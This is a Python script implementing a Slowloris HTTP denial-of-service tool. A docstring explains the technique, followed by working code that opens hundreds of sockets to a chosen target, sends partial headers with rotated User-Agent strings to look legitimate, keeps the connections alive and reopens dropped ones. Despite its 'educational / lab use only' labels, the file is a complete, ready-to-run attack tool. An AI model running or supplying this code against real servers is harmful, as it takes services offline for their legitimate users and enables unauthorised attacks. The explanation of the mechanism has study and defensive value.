#!/usr/bin/env python3
"""
Slowloris HTTP Attack Tool — Educational / Lab Use Only

Slowloris is a Layer 7 (Application) denial-of-service attack that holds
many HTTP connections open simultaneously by sending partial HTTP requests.
The server keeps each connection open waiting for the request to complete,
eventually exhausting its connection pool.

How it works:
  1. Open many TCP connections to the target web server
  2. Send a partial HTTP request header (but never finish it)
  3. Periodically send additional header lines to keep connections alive
  4. Server holds each connection open, waiting for the complete request
  5. Eventually all connection slots are consumed
  6. Legitimate users cannot connect

Unlike volumetric attacks, Slowloris uses very little bandwidth.

Usage:
  python3 slowloris.py <target_ip> [options]

Note: Does NOT require root/sudo (uses regular TCP sockets)
"""

import argparse
import random
import signal
import socket
import sys
import time

signal.signal(signal.SIGINT, lambda *_: (print("\nStopped."), sys.exit(0)))

# Random User-Agent strings to look more legitimate
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]


def create_socket(target_ip: str, target_port: int, timeout: int) -> socket.socket | None:
    """Create a TCP socket and send the initial partial HTTP request."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target_ip, target_port))

        # Send initial partial HTTP request
        ua = random.choice(_USER_AGENTS)
        initial_request = (
            f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept-language: en-US,en;q=0.5\r\n"
        )
        sock.send(initial_request.encode())
        return sock
    except (socket.error, OSError):
        return None


def slowloris(target_ip: str, target_port: int, num_sockets: int, sleep_time: int):
    """Run the Slowloris attack."""
    print(f"[SLOWLORIS] Target: {target_ip}:{target_port}")
    print(f"[SLOWLORIS] Sockets: {num_sockets}, Keep-alive interval: {sleep_time}s")
    print("[SLOWLORIS] Press Ctrl+C to stop\n")

    sockets: list[socket.socket] = []

    # Initial connection burst
    print(f"Opening {num_sockets} connections...")
    for _ in range(num_sockets):
        sock = create_socket(target_ip, target_port, timeout=4)
        if sock:
            sockets.append(sock)
    print(f"  Opened {len(sockets)} connections\n")

    # Main keep-alive loop
    cycle = 0
    while True:
        cycle += 1
        print(f"[Cycle {cycle}] Sending keep-alive headers to {len(sockets)} sockets...")

        # Send keep-alive headers
        dropped = 0
        for sock in list(sockets):
            try:
                # Send a partial header to keep the connection alive
                header = f"X-a: {random.randint(1, 5000)}\r\n"
                sock.send(header.encode())
            except (socket.error, OSError):
                sockets.remove(sock)
                dropped += 1

        if dropped > 0:
            print(f"  Dropped {dropped} dead connections")

        # Replenish closed connections
        needed = num_sockets - len(sockets)
        if needed > 0:
            print(f"  Reopening {needed} connections...")
            for _ in range(needed):
                sock = create_socket(target_ip, target_port, timeout=4)
                if sock:
                    sockets.append(sock)

        print(f"  Active connections: {len(sockets)}/{num_sockets}")
        time.sleep(sleep_time)


def main():
    parser = argparse.ArgumentParser(
        description="Slowloris — Educational HTTP DDoS Testing Tool",
        epilog="⚠️  FOR AUTHORIZED LAB/EDUCATIONAL USE ONLY\n"
               "Note: Does NOT require root/sudo",
    )
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-n", "--num-sockets", type=int, default=200, help="Number of sockets (default: 200)")
    parser.add_argument("-t", "--sleep-time", type=int, default=15, help="Keep-alive interval in seconds (default: 15)")

    args = parser.parse_args()
    slowloris(args.target, args.port, args.num_sockets, args.sleep_time)


if __name__ == "__main__":
    main()
